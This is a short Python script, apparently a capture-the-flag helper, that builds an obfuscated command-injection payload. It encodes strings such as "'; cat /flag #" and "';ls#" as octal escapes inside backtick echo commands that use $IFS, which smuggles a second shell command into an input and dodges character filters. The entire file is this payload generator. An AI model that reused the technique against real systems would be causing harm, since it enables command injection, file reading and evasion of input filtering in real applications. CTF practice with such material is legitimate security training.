def char_to_octal(c):
    return format(ord(c), 'o')



web="' ; cat /flag # \""

web="';ls#\""

for i in web:
    num=char_to_octal(i)

    payload=f"`echo$IFS'\\{num}'`"

    print(payload,end="")


print()
print(web)
